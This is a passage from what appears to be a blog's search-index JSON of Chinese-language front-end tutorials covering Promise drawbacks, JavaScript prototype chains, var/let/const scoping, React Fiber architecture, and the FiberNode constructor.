{</span></span><br><span class=\"line\"><span class=\"comment\">//       resolve(2);</span></span><br><span class=\"line\"><span class=\"comment\">//     }),</span></span><br><span class=\"line\"><span class=\"comment\">//     () =&gt; {</span></span><br><span class=\"line\"><span class=\"comment\">//       return 123;</span></span><br><span class=\"line\"><span class=\"comment\">//     },</span></span><br><span class=\"line\"><span class=\"comment\">//     88888,</span></span><br><span class=\"line\"><span class=\"comment\">//   ]);</span></span><br><span class=\"line\"><span class=\"comment\">//   res.then((res) =&gt; {</span></span><br><span class=\"line\"><span class=\"comment\">//     console.log(res);</span></span><br><span class=\"line\"><span class=\"comment\">//   });</span></span><br><span class=\"line\"><span class=\"comment\">// })();</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// (async function() {</span></span><br><span class=\"line\"><span class=\"comment\">//   const res = MyPromise.race([</span></span><br><span class=\"line\"><span class=\"comment\">//     new MyPromise((resolve) =&gt; {</span></span><br><span class=\"line\"><span class=\"comment\">//       resolve(1);</span></span><br><span class=\"line\"><span class=\"comment\">//     }),</span></span><br><span class=\"line\"><span class=\"comment\">//     new MyPromise((resolve) =&gt; {</span></span><br><span class=\"line\"><span class=\"comment\">//       resolve(2);</span></span><br><span class=\"line\"><span class=\"comment\">//     }),</span></span><br><span class=\"line\"><span class=\"comment\">//   ]);</span></span><br><span class=\"line\"><span class=\"comment\">//   res.then((res) =&gt; {</span></span><br><span class=\"line\"><span class=\"comment\">//     console.log(res);</span></span><br><span class=\"line\"><span class=\"comment\">//   });</span></span><br><span class=\"line\"><span class=\"comment\">// })();</span></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<h5 id=\"Promise-的缺点\"><a href=\"#Promise-的缺点\" class=\"headerlink\" title=\"Promise 的缺点\"></a>Promise 的缺点</h5><p>无法取消 Promise，一旦新建它就会立即执行，无法中途取消。</p>\n<p>如果不设置回调函数，Promise 内部抛出的错误，不会反应到外部。</p>\n<p>当处于 pending 状态时，无法得知目前进展到哪一个阶段 (刚刚开始 还是即将完成)。</p>\n<h5 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a>总结:</h5><p>Promise 对象是异步编程的一种解决方案，最早由社区提出。Promise 是一个构造函数，接收一个函数作为参数，返回一个 Promise 实例。 一个 Promise 实例有三种状态，分别是 pending、resolved 和 rejected，分别代表了进行中、已成功和已失败。实例的状态只能由 pending 转变 resolved 或者 rejected 状态，并且状态一经改变， 就凝固了，无法再被改变了。</p>\n<p>状态的改变是通过 resolve () 和 reject () 函数来实现的，可以在 异步操作结束后调用这两个函数改变 Promise 实例的状态，它的原 型上定义了一个 then 方法，使用这个 then 方法可以为两个状态的 改变注册回调函数。这个回调函数属于微任务，会在本轮事件循环的 末尾执行。</p>\n<p>注意：在构造 Promise 的时候，构造函数内部的代码是立即执行的。</p>\n","categories":["前端","es6"],"tags":["前端","JavaScript","es6"]},{"title":"对原型、原型链的理解","url":"//javascript/prototype.html","content":"<p>在 JavaScript 中是使用构造两数来新建一个对象的，每一个构造函数的内部都有一个 prototype 属性，它的属性值是一个对象，这个对象包含了可以由该构造西数的所有实例共享的属性和方法。<br>当使用构造函数新建一个对象后，在这个对象的内部将包含一个指针，这个指针指向构造两数的 prototype 属性对应的值，在 ES5 中这个指针被称为对象的原型。一般来说不应该能够获取到这个值的，但是现在 浏览器中都实现了_proto_ 属性来访问这个属性，但是最好不要 使用这个属性，因为它不是规范中规定的。ES5 中新增了一个 Object.getPrototypeOf () 方法，可以通过这个方法米获取对象的原型。 </p>\n<p>当访问一个对象的属性时，如果这个对象内部不存在这个属性，那么它就会去它的原型对象里找这个属性，这个原型对象义会有自己的原型，于是就这样一直找下去，也就是原型链的概念。原型链的尽头一般来说都是 0bject.prototype 所以这就是新建的对象为什么能够使用 toString () 等方法的原因。 </p>\n<p>特点：JavaScript 对象是通过引用来传递的，创建的每个新对象实体中并没有一份属于自己的原型副本。当修改原型时，与之相关的对象也会继承这一改变。<br><img data-src=\"https://pic.imgdb.cn/item/65366accc458853aefbfcd92.jpg\" alt=\"原型链图解\"><br>那么原型链的终点是什么？如何打印出原型链的终点？</p>\n<p>由于 Object 是构造函数，原型链终点 Ob ject.prototype._proto_，而 Object.prototype.<em>proto</em> === null //true，所以，原型链的终点是 null。原型链上的所有原型都是对象，所有的对象最终都是由 0bject 构造的，而 Object.prototype 的下一级是 Object. prototype._proto_。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/653668e4c458853aefb94875.jpg\" alt=\"在这里插入图片描述\"></p>\n","categories":["前端","es6"],"tags":["前端","JavaScript","es6"]},{"title":"var、let、const 的区别","url":"//javascript/var/let/const.html","content":"<h5 id=\"var-关键词\"><a href=\"#var-关键词\" class=\"headerlink\" title=\"var 关键词\"></a>var 关键词</h5><ol>\n<li>var 声明作用域<br>var 定义的变量，没有块的概念，可以跨块访问，不能跨函数访问 </li>\n</ol>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">test</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">var</span> message = <span class=\"string\">\"hello world\"</span>;   <span class=\"comment\">// 局部变量</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">test</span>();</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(message);  <span class=\"comment\">// 报错</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>函数 test () 调用时会创建变量 message 并给它赋值，调用之后变量随即被销毁。因此，在函数 test () 之外调用变量 message 会报错</p>\n<p>在函数内定义变量时省略 var 操作符，可以创建一个全局变量</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">test</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    message = <span class=\"string\">\"hello world\"</span>;   <span class=\"comment\">// 局部变量</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">test</span>();</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(message);  <span class=\"comment\">// hello world</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>省略掉 var 操作符之后，message 就变成了全局变量。只要调用一次函数 test ()，就会定义这个变量，并且可以在函数外部访问到。在局部作用域中定义的全局变量很难维护，不推荐这么做。在严格模式下，如果像这样给未声明的变量赋值，则会导致抛出 ReferenceError。</p>\n<ol start=\"2\">\n<li>var 声明提升<br>var 在 js 中是支持预解析的，如下代码不会报错。这是因为使用 var 声明的变量会自动提升到函数作用域顶部：</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(age);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> age = <span class=\"number\">26</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">foo</span>(); <span class=\"comment\">// undefined</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>javaScript 引擎，在代码预编译时，javaScript 引擎会自动将所有代码里面的 var 关键字声明的语句都会提升到当前作用域的顶端，如下代码：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">var</span> age;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(age);</span><br><span class=\"line\">    age = <span class=\"number\">26</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">foo</span>(); <span class=\"comment\">// undefined</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h5 id=\"let声明\"><a href=\"#let声明\" class=\"headerlink\" title=\"let声明\"></a>let 声明</h5><ol>\n<li>let 声明作用域<br>let 定义的变量，只能在块作用域里访问，不能跨块访问，也不能跨函数访问，而 var 可以跨块访问 </li>\n</ol>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// var定义的变量</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"literal\">true</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">var</span> name = <span class=\"string\">'Matt'</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(name); <span class=\"comment\">// Matt</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(name); <span class=\"comment\">// Matt</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// let定义的变量</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"literal\">true</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> age = <span class=\"number\">26</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(age); <span class=\"comment\">// 26</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(age); <span class=\"comment\">// ReferenceError: age没有定义</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>let 也不允许同一个块作用域中出现冗余声明（重复声明）</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name;</span><br><span class=\"line\"><span class=\"keyword\">var</span> name;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> age;</span><br><span class=\"line\"><span class=\"keyword\">let</span> age; <span class=\"comment\">// SyntaxError；标识符age已经声明过了</span></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>暂时性死区<br>let、const 与 var 的另一个重要的区别，let、const 声明的变量不会在作用域中被提升。ES6 新增的 let、const 关键字声明的变量会产生块级作用域，如果变量在当前作用域中被创建出来，由于此时还未完成语法绑定，所以是不能被访问的，如果访问就会抛出错误 ReferenceError。因此，在这运行流程进入作用域创建变量，到变量可以被访问之间的这一段时间，就称之为暂时死区。</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// name会被提升</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(name); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">'Matt'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// age不会被提升</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(age); <span class=\"comment\">// ReferenceError：age没有定义</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> age = <span class=\"number\">26</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"3\">\n<li>全局声明<br>与 var 关键字不同，var 定义的全局变量会挂载到 window 对象上，使用 window 可以访问，而 let 在全局作用域中声明的变量不会成为 window 对象的属性 </li>\n</ol>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">'Matt'</span>;</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">name</span>); <span class=\"comment\">// 'Matt'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> age = <span class=\"number\">26</span>;</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">age</span>); <span class=\"comment\">// undefined</span></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>for 循环中的 var、let 声明<br>for 循环中 var 定义的迭代变量会渗透到循环体外部：</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; ++i) {</span><br><span class=\"line\">    <span class=\"comment\">// 循环逻辑</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(i); <span class=\"comment\">// 5</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>改成使用 let 之后，这个问题就消失了，因为迭代变量的作用域仅限于 for 循环块内部：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; ++i) {</span><br><span class=\"line\">    <span class=\"comment\">// 循环逻辑</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(i); <span class=\"comment\">// ReferenceError: i没有定义</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>使用 var 和 let 定义 for 循环中的变量，循环里使用定时器 setTimeout 后循环结果如下代码：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; ++i) {</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(i), <span class=\"number\">0</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 输出5、5、5、5、5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; ++i) {</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(i), <span class=\"number\">0</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 输出0、1、2、3、4</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>let 是在代码块内有效，var 是在全局范围内有效。let 只能声明一次 ，var 可以声明多次。</p>\n<p>当同步代码执行完毕后，开始执行异步的 setTimeout 代码，执行 setTimeout 时需要从当前作用域内寻找一个变量 i，for 循环执行完毕，当前 i=5，执行 setTimeout 时输出为 5，任务队列中的剩余 4 个 setTimeout 也依次执行，输出为 5。</p>\n<p>变量 j 是用 let 声明的，当前的 i 只在本轮循环中有效，每次循环的 j 其实都是一个新的变量，所以 setTimeout 定时器里面的 j 其实是不同的变量，即最后输出 0-4。</p>\n<h5 id=\"const声明\"><a href=\"#const声明\" class=\"headerlink\" title=\"const声明\"></a>const 声明</h5><p>const 的行为与 let 基本相同，唯一一个重要的区别是：</p>\n<p>const 是用来定义常量的，而且定义的时候必须赋值，不赋值会报错，定义之后是不允许被修改的，修改 const 声明的变量会导致运行时错误。</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> age = <span class=\"number\">26</span>;</span><br><span class=\"line\">age = <span class=\"number\">36</span>; <span class=\"comment\">// TypeError: 给常量赋值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// const也不允许重复声明</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> name = <span class=\"string\">'Matt'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> name = <span class=\"string\">'Nicholas'</span>; <span class=\"comment\">// SyntaxError</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// const声明的作用域也是块</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> name = <span class=\"string\">'Matt'</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"literal\">true</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> name = <span class=\"string\">'Nicholas'</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(name); <span class=\"comment\">// Matt</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>而 const 声明的变量是一个对象时，修改这个对象内部的属性并不会报错。</p>\n<p>这是因为 const 声明的是栈区里的内容不能修改，基本数据类型的值直接在栈内存中存储，而引用数据类型在栈区保存的是对象在堆区的地址，修改对象的属性，不会修改对象在栈区的地址，如果重新给对象 person 赋值，则会报错。</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> person = {</span><br><span class=\"line\">    <span class=\"attr\">name</span>: <span class=\"string\">'Lili'</span></span><br><span class=\"line\">};</span><br><span class=\"line\">person.<span class=\"property\">name</span> = <span class=\"string\">'Matt'</span>; <span class=\"comment\">// ok</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>JavaScript 引擎会为 for 循环中的 let 声明分别创建独立的变量实例，虽然 const 变量跟 let 变量很相似，但是不能用 const 来声明迭代变量（因为迭代变量会自增）：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; ++i) {} <span class=\"comment\">// TypeError：给常量赋值</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>不过，如果你只想用 const 声明一个不会被修改的 for 循环变量，那也是可以的。也就是说，每次迭代只是创建一个新变量。这对 for-of 和 for-in 循环特别有意义：</p>\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> j = <span class=\"number\">7</span>; i &lt; <span class=\"number\">5</span>; ++i) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(j);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 7, 7, 7, 7, 7</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> key <span class=\"keyword\">in</span> {<span class=\"attr\">a</span>: <span class=\"number\">1</span>, <span class=\"attr\">b</span>: <span class=\"number\">2</span>}) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(key);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// a, b</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> value <span class=\"keyword\">of</span> [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>]) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(value);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 1, 2, 3, 4, 5</span></span><br></pre></td></tr></tbody></table></figure>\n","categories":["前端","es6"],"tags":["前端","JavaScript","es6"]},{"title":"Fiber 架构实现流程","url":"//react/fiber/implement.html","content":"<p>Fiber 架构是 React 中用于实现虚拟 DOM 的一种算法架构。它的目标是提高渲染性能和用户体验，通过将渲染工作分割成多个小任务，在不阻塞主线程的情况下逐步完成整个渲染过程。</p>\n<p>下面是 Fiber 架构的简要实现过程：</p>\n<ul>\n<li><p>构建 Fiber 树：在进行首次渲染时，React 会构建一棵 Fiber 树，用于表示组件的层级结构和渲染顺序。每个 Fiber 节点对应一个组件实例，其中包含组件的状态、属性和其他相关信息。</p>\n</li>\n<li><p>初始渲染阶段：React 通过递归遍历 Fiber 树，在每个 Fiber 节点上执行渲染操作，生成对应的虚拟 DOM 元素。</p>\n</li>\n<li><p>任务拆分：在渲染过程中，React 根据时间片（Time Slicing）的概念将渲染任务拆分为多个小任务（Fiber），每个小任务执行时间有限，并且可以中断和恢复。</p>\n</li>\n<li><p>优先级调度：React 使用优先级调度算法确定哪些任务具有更高的优先级，并按照顺序执行这些高优先级的任务，以保证用户界面的流畅度。</p>\n</li>\n<li><p>增量更新：在执行每个小任务时，React 会比较前后两次渲染结果，找出需要更新的部分，并对其进行增量更新。这样可以避免全量重新渲染，提高性能。</p>\n</li>\n<li><p>渲染结果提交：当所有小任务完成后，React 将最终渲染结果提交给浏览器进行绘制，完成整个渲染过程。</p>\n</li>\n</ul>\n<p>Fiber 架构的实现使得 React 能够在多任务之间动态地切换，并根据任务的优先级和时间片进行灵活的调度。这样可以更好地响应用户的交互，提供更流畅的用户体验。</p>\n","categories":["React","Fiber"],"tags":["前端","JavaScript","react","Fiber"]},{"title":"Fiber 架构的起源","url":"//react/fiber.html","content":"<h1 id=\"Fiber-架构的起源\"><a href=\"#Fiber-架构的起源\" class=\"headerlink\" title=\"Fiber 架构的起源\"></a>Fiber 架构的起源</h1><p>Fiber 架构的起源可以追溯到 React 团队在 2017 年提出的一项重大改进计划。在过去的 React 版本中，渲染过程是基于递归的，即组件树的遍历是通过递归函数来完成的。这种方式在大规模复杂应用中可能会引发一些性能问题，例如长时间的主线程阻塞，导致用户体验下降。</p>\n<span id=\"more\"></span>\n<p>为了解决这些性能问题，React 团队开始着手设计一种新的渲染架构，即 Fiber 架构。Fiber 架构的目标是使 React 的渲染过程可中断和恢复，从而实现更好的任务调度、优先级管理和增量更新。</p>\n<p>Fiber 这个名字来源于计算机科学中的 “Fiber”（纤程）概念，指的是一种轻量级的执行单元，可以在多个任务之间切换，并且可以中断和恢复执行。React 中的 Fiber 也是类似的概念，表示渲染过程中的任务单元，可以根据任务的优先级和时间片进行灵活的调度和中断。</p>\n<p>通过 Fiber 架构，React 实现了一个基于链表结构的 Fiber 树，用于表示组件的层级关系和渲染顺序。同时，React 还引入了优先级调度算法，通过动态调整任务的优先级，可以根据不同任务的重要性和紧急程度来合理地分配渲染资源。</p>\n<p>Fiber 架构的引入使得 React 在渲染过程中可以更加灵活地响应用户交互，提供更好的用户体验。它为 React 提供了更强大的渲染能力，能够支持更复杂、更大规模的应用程序。</p>\n<p>值得一提的是，Fiber 架构的设计和实现是一个非常复杂的过程，并且在不同版本的 React 中可能会有一些细节上的差异。React 团队在不断地改进和优化 Fiber 架构，以进一步提升 React 应用的性能和可靠性。</p>\n<h1 id=\"Fiber的含义\"><a href=\"#Fiber的含义\" class=\"headerlink\" title=\"Fiber的含义\"></a>Fiber 的含义</h1><blockquote>\n<p>总的来说，Fiber 是 React 中的一种渲染架构和调度算法，通过将渲染过程划分为可中断和恢复的任务单元，实现了增量更新和优先级调度。Fiber 架构的引入使得 React 能够更加高效地处理渲染任务，提供更好的用户体验和更高的性能。</p>\n</blockquote>\n<p>Fiber 是 React 中的一个概念，它有多个含义和作用：</p>\n<ul>\n<li><p>渲染任务单元：在 React 中，Fiber 表示渲染过程中的任务单元。传统的递归渲染方式可能会导致长时间的主线程阻塞，影响用户体验。而 Fiber 架构将渲染过程划分为一系列小的任务单元（Fiber 节点），可以根据任务的优先级和时间片进行灵活的调度和中断，实现增量更新和任务的并发处理。</p>\n</li>\n<li><p>调度和优先级管理：Fiber 架构引入了一套调度算法，用于根据任务的优先级和时间片来动态调整任务的执行顺序。通过优先级调度，React 可以根据任务的重要性和紧急程度合理地分配渲染资源，从而提供更好的用户体验。优先级调度还使得 React 可以在不同任务之间进行中断和恢复，避免了长时间的阻塞。</p>\n</li>\n<li><p>组件结构表示：Fiber 架构引入了基于链表结构的 Fiber 树，用于表示组件的层级关系和渲染顺序。每个 Fiber 节点表示一个组件或 DOM 元素，并通过 child、sibling 和 return 等属性建立起节点之间的关联。通过 Fiber 树的结构，React 可以更加高效地遍历和更新组件树，实现增量渲染。</p>\n</li>\n<li><p>增量更新：Fiber 架构支持增量更新，即仅更新发生变化的部分，而不需要重新渲染整个组件树。通过对比 Fiber 树的两个状态，React 可以确定哪些组件需要更新，并且可以跳过不需要更新的部分，从而提高渲染性能。</p>\n</li>\n</ul>\n<p><img data-src=\"https://pic.imgdb.cn/item/653b551cc458853aef02aa5f.jpg\" alt=\"react 中一帧的过程\"></p>\n","categories":["React","Fiber"],"tags":["前端","JavaScript","react","Fiber"]},{"title":"FiberNode 结构解析","url":"//react/fiber/node.html","content":"<h1 id=\"FiberNode结构解析\"><a href=\"#FiberNode结构解析\" class=\"headerlink\" title=\"FiberNode结构解析\"></a>FiberNode 结构解析</h1><p>FiberNode（也称为 Fiber 节点）是 React Fiber 架构中的核心概念之一，用于表示组件的层级结构和渲染过程中的任务。</p>\n<span id=\"more\"></span>\n\n\n<figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">FiberNode</span>(<span class=\"params\">tag, pendingProps, key, mode</span>) {</span><br><span class=\"line\">  <span class=\"comment\">// Instance</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">tag</span> = tag;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">key</span> = key;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">elementType</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">type</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">stateNode</span> = <span class=\"literal\">null</span>; <span class=\"comment\">// Fiber</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">return</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">child</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">sibling</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">index</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">ref</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">pendingProps</span> = pendingProps;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">memoizedProps</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">updateQueue</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">memoizedState</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">dependencies</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">mode</span> = mode; <span class=\"comment\">// Effects</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">flags</span> = <span class=\"title class_\">NoFlags</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">subtreeFlags</span> = <span class=\"title class_\">NoFlags</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">deletions</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">lanes</span> = <span class=\"title class_\">NoLanes</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">childLanes</span> = <span class=\"title class_\">NoLanes</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">alternate</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  {</span><br><span class=\"line\">    <span class=\"comment\">// Note: The following is done to avoid a v8 performance cliff.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// Initializing the fields below to smis and later updating them with</span></span><br><span class=\"line\">    <span class=\"comment\">// double values will cause Fibers to end up having separate shapes.</span></span><br><span class=\"line\">    <span class=\"comment\">// This behavior/bug has something to do with Object.preventExtension().</span></span><br><span class=\"line\">    <span class=\"comment\">// Fortunately this only impacts DEV builds.</span></span><br><span class=\"line\">    <span class=\"comment\">// Unfortunately it makes React unusably slow for some applications.</span></span><br><span class=\"line\">    <span class=\"comment\">// To work around this, initialize the fields below with doubles.</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// Learn more about this here:</span></span><br><span class=\"line\">    <span class=\"comment\">// https://github.com/facebook/react/issues/14365</span></span><br><span class=\"line\">    <span class=\"comment\">// https://bugs.chromium.org/p/v8/issues/detail?id=8538</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">actualDuration</span> = <span class=\"title class_\">Number</span>.<span class=\"property\">NaN</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">actualStartTime</span> = <span class=\"title class_\">Number</span>.<span class=\"property\">NaN</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">selfBaseDuration</span> = <span class=\"title class_\">Number</span>.<span class=\"property\">NaN</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">treeBaseDuration</span> = <span class=\"title class_\">Number</span>.<span class=\"property\">NaN</span>; <span class=\"comment\">// It's okay to replace the initial doubles with smis after initialization.</span></span><br><span 